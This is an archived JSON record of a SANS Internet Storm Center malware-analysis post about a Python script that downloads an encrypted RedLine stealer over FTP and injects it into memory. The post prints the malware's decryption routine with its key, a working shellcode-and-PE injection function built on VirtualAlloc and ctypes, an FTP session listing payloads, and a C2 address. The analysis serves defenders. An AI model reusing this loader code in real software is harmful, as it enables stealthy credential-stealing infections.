{
    "id": "285857e3-4d28-4631-a685-67100a40e921",
    "created_at": "2023-01-12T15:08:09.403327Z",
    "updated_at": "2025-03-27T02:05:38.620962Z",
    "deleted_at": null,
    "sha1_hash": "78ed8f65b5c0d7028dbb8481e2ff12a643c22edf",
    "title": "2022-01-20 - RedLine Stealer Delivered Through FTP",
    "authors": "",
    "file_creation_date": "2022-05-28T15:58:08Z",
    "file_modification_date": "2022-05-28T15:58:08Z",
    "file_size": 4500984,
    "plain_text": "# SANS ISC: RedLine Stealer Delivered Through FTP - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/RedLine+Stealer+Delivered+Through+FTP/28258/](https://isc.sans.edu/forums/diary/RedLine+Stealer+Delivered+Through+FTP/28258/)**\n\n\n-----\n\n[Here is a piece of malicious Python script that injects a RedLine[1] stealer into its own](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)\nprocess. Process injection is a common attacker’s technique these days (for a long time\nalready). The difference, in this case, is that the payload is delivered through FTP! It’s pretty\nunusual because FTP is today less and less used for multiple reasons (lack of encryption by\ndefault, complex to filter with those passive/active modes). Support for FTP has even been\ndisabled by default in Chrome starting with version 95! But FTP remains a common protocol\nin the IoT/Linux landscape with malware families like Mirai. My honeypots still collect a lot of\nMirai samples on FTP servers. I don't understand why the attacker chose this protocol\nbecause, in most corporate environments, FTP is not allowed by default (and should\ndefinitely not be!).\n\n\n-----\n\nThe Python script contains the credentials and FTP server IP address. When you connect\nmanually, you can list a bunch of different payloads but the one used in this case is 001.enc.\n```\nremnux@remnux:/MalwareZoo/20220119$ ftp x.x.x.x\nConnected to x.x.x.x.\n220-FileZilla Server 0.9.60 beta\n220-written by Tim Kosse (tim.kosse@filezilla-project.org)\n220 Please visit https://filezilla-project.org/\nName (62.109.1.213:root): launcher\n331 Password required for launcher\nPassword:\n230 Logged on\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||58066|)\n150 Opening data channel for directory listing of \"/\"\n-r--r--r-- 1 ftp ftp     228352 Jan 17 21:25 001.ENC\n-r--r--r-- 1 ftp ftp     228352 Jan 17 21:25 002.ENC\n-r--r--r-- 1 ftp ftp     879104 Jan 17 09:26 11.ENC\n-r--r--r-- 1 ftp ftp     675840 Aug 14 2021 1650.ENC\n-r--r--r-- 1 ftp ftp     675328 Dec 11 2021 167.ENC\n-r--r--r-- 1 ftp ftp     675328 Jan 02 13:01 1680.ENC\n226 Successfully transferred \"/\"\nftp>\n\n```\nThe payload is encrypted and the following function does the job to decrypt the PE file:\n```\ndef encode_data(data):\n  key = b\"JHGIEKC6U\"\n  S = bytearray(range(256))\n  j = 0\n  out = bytearray()\n  for i in range(256):\n    j = (j + S[i] + key[i % len(key)]) % 256\n    S[i], S[j] = S[j], S[i]\n  i = j = 0\n  for char in data:\n    i = ( i + 1 ) % 256\n    j = ( j + S[i] ) % 256\n    S[i], S[j] = S[j], S[i]\n    out.append(char ^ S[(S[i] + S[j]) % 256])\n  return(bytes(out))\n\n```\nLike I said to my students when I'm teaching FOR610, when you are investigating an\nincident, the way the payload was encrypted/encoded is less relevant. The payload in itself\nis important. To extract the PE file, I just wrote a quick Python script that replicates this\nfunction and dumps the payload into a file.\n\nThe decrypted payload SHA256 is\n0eeb332efa3c20c2f3d85d07d844ba6150bdee3c1eade52f0f2449c3d2727334 and is\nunknown on VT at this time.\n\n\n-----\n\nThe script also has a hex-encoded shellcode. Why do we have a shellcode and another\npayload? Here is the function used to inject the code:\n```\ndef runpe(peimage):\n  filepathenv = \"%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe\"\n  filepath = os.path.expandvars(filepathenv)\n  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n  p = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(sc)), \n      ctypes.c_int(0x3000), ctypes.c_int(0x40))\n  ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(p), sc, ctypes.c_int(len(sc)))\n  q = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\nctypes.c_int(len(peimage)), \n      ctypes.c_int(0x3000), ctypes.c_int(0x40))\n  ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(q), peimage,\nctypes.c_int(len(peimage)))\n  run = ctypes.cast(p, ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p,\nctypes.c_void_p))\n  run(filepath.encode('utf8')+b'\\x00', q)\n\n```\nYou see that two calls to `VirtualAlloc() are performed. The first one is used to load the`\nshellcode into memory and the second to load the payload (RedLine itself). The most\ninteresting line is the one with the `ctypes.cast() . This function allows casting the`\nshellcode to act as a function pointer. Once completed, the shellcode can be called like any\nstandard Python function:\n```\nrun(filepath.encode('utf8')+b'\\x00', q)\n\n```\nThrough the shellcode, Python will execute RedLine that has been injected in memory\nbefore. My sample tried to connect to the following C2 but it was offline\n(78[.]24[.]222[.]162:37819).\n\nThe initial Python script\n(SHA256:e6d6451b82a03a3199770c490907ef01c401cc44826162a97d0f22aa9c122619)\n[has a VT score of 14/58[2].](https://www.virustotal.com/gui/file/e6d6451b82a03a3199770c490907ef01c401cc44826162a97d0f22aa9c122619)\n\n[1] [https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)\n\n[2] https://www.virustotal.com/gui/file/e6d6451b82a03a3199770c490907ef01c401cc4482616\n2a97d0f22aa9c122619\n\nXavier Mertens (@xme)\nXameco\nSenior ISC Handler - Freelance Cyber Security Consultant\n[PGP Key](https://keybase.io/xme/key.asc)\n\nI will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and\nTechniques - SANS London June 2022\n\n\n-----\n\nXme\n\n687 Posts\nISC Handler\nJan 20th 2022\n\nSo if using FTP for file transfer is not a good idea, what to use ?\n\nStephane\n\n3 Posts\nFTP is a clear protocol that is dangerous to use on an untrusted network. In itself, it works\npretty well to exchange files but, if you must stick to it, be sure to transfer files through a VPN\nor a secure network. Alternatives are SFTP, SFP, HTTPS, …\n\nXme\n\n687 Posts\nISC Handler\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-20 - RedLine Stealer Delivered Through FTP.pdf"
    ],
    "report_names": [
        "2022-01-20 - RedLine Stealer Delivered Through FTP.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536089,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653753488,
    "ts_modification_date": 1653753488,
    "files": {
        "pdf": "https://archive.orkl.eu/78ed8f65b5c0d7028dbb8481e2ff12a643c22edf.pdf",
        "text": "https://archive.orkl.eu/78ed8f65b5c0d7028dbb8481e2ff12a643c22edf.txt",
        "img": "https://archive.orkl.eu/78ed8f65b5c0d7028dbb8481e2ff12a643c22edf.jpg"
    }
}